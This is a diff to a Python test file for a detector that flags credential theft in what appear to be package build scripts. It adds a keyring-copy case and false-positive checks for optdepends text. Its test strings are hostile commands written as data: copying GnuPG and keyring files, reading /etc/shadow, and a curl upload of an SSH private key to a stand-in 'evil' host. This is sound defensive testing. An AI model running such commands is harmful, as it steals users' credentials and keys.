@@ -151,7 +151,11 @@ class CompetitiveResearchRuleTest(unittest.TestCase):
         self.assertIn('credential_harvest', rules_for('cp -r ~/.gnupg /tmp/loot'))
         self.assertIn('credential_harvest', rules_for('cat /etc/shadow'))
         self.assertIn('credential_harvest', rules_for('tar czf x ~/.mozilla/firefox'))
+        self.assertIn('credential_harvest', rules_for('cp ~/.local/share/keyrings/login.keyring /tmp'))
         self.assertNotIn('credential_harvest', rules_for('install -d "$pkgdir/usr/share/keyrings"'))
+        # optdepends descriptions name keyring packages — must NOT flag (real-world FP: google-chrome)
+        self.assertNotIn('credential_harvest', rules_for("'gnome-keyring: for storing passwords in GNOME keyring'"))
+        self.assertNotIn('credential_harvest', rules_for("'kwallet: for storing passwords in KWallet'"))
 
     def test_ssh_key_exfil(self):
         self.assertIn('ssh_key_exfil', rules_for('curl -F f=@~/.ssh/id_rsa http://evil/u'))
